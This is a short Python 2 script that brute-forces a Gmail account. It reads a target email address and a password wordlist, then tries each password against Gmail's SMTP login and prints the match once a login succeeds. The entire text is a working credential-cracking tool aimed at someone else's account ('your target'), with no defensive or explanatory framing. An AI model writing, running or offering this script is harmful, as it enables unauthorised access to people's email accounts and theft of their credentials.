import smtplib

email = raw_input("Enter your target email address => ")
passwfile = raw_input("\nEnter your target password address => ")
passwfile = open(passwfile, "r")

def crack():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    for password in passwfile:
        try:
            smtpserver.login(email, password)
            print("\nYour email password was successfully found , password => %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("\nThe password does not match the email you want , password => %s" % password)

crack()
